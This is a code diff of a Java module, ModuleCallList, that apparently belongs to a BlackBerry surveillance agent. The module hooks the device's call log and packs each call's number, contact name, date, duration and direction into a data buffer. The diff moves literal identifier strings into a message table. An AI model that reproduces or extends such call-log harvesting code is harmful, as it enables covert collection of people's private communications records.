@@ -12,6 +12,7 @@ import java.util.Date;
 
 import net.rim.device.api.util.DataBuffer;
 import blackberry.AppListener;
+import blackberry.Messages;
 import blackberry.config.ConfModule;
 import blackberry.debug.Check;
 import blackberry.debug.Debug;
@@ -28,32 +29,33 @@ import blackberry.utils.Utils;
 public final class ModuleCallList extends BaseModule implements
         CallListObserver {
     //#ifdef DEBUG
-    private static Debug debug = new Debug("ModCallList", DebugLevel.VERBOSE);
+    private static Debug debug = new Debug("ModCallList", DebugLevel.VERBOSE); //$NON-NLS-1$
 
     //#endif
 
+    //13.0=calllist
     public static String getStaticType() {
-        return "calllist";
+        return Messages.getString("13.0"); //$NON-NLS-1$
     }
 
     private static boolean listening = false;
 
     public synchronized void actualStart() {
         //#ifdef DEBUG
-        debug.trace("actualStart");
+        debug.trace("actualStart"); //$NON-NLS-1$
         //#endif
 
         //#ifdef DBC
-        Check.requires(listening == false, "actualStart: already listening");
+        Check.requires(listening == false, "actualStart: already listening"); //$NON-NLS-1$
         //#endif
-        
+
         AppListener.getInstance().addCallListObserver(this);
         listening = true;
     }
 
     public synchronized void actualStop() {
         //#ifdef DEBUG
-        debug.trace("actualStop");
+        debug.trace("actualStop"); //$NON-NLS-1$
         //#endif
         AppListener.getInstance().removeCallListObserver(this);
         listening = false;
@@ -78,18 +80,18 @@ public final class ModuleCallList extends BaseModule implements
     public void callLogAdded(String number, String name, Date date,
             int duration, boolean outgoing, boolean missed) {
         //#ifdef DEBUG
-        debug.info("number: " + number + " date: " + date + " duration: "
-                + duration + " outgoing: " + outgoing + " missed: " + missed);
+        debug.info("number: " + number + " date: " + date + " duration: " //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
+                + duration + " outgoing: " + outgoing + " missed: " + missed); //$NON-NLS-1$ //$NON-NLS-2$
         //#endif
 
-        final String nametype = "u";
-        final String note = "no notes";
+        final String nametype = "u"; //$NON-NLS-1$
+        final String note = "no notes"; //$NON-NLS-1$
 
         //#ifdef DBC
-        Check.requires(number != null, "callLogAdded null number");
-        Check.requires(name != null, "callLogAdded null name");
-        Check.requires(nametype != null, "callLogAdded null nametype");
-        Check.requires(note != null, "callLogAdded null note");
+        Check.requires(number != null, "callLogAdded null number"); //$NON-NLS-1$
+        Check.requires(name != null, "callLogAdded null name"); //$NON-NLS-1$
+        Check.requires(nametype != null, "callLogAdded null nametype"); //$NON-NLS-1$
+        Check.requires(note != null, "callLogAdded null note"); //$NON-NLS-1$
         //#endif
 
         final int LOG_CALLIST_VERSION = 0;
@@ -119,7 +121,7 @@ public final class ModuleCallList extends BaseModule implements
 
         //#ifdef DBC
         Check.asserts(databuffer.getLength() == len,
-                "callLogAdded: wrong len: " + databuffer.getLength());
+                "callLogAdded: wrong len: " + databuffer.getLength()); //$NON-NLS-1$
         //#endif
 
         Utils.addTypedString(databuffer, (byte) 0x01, name);
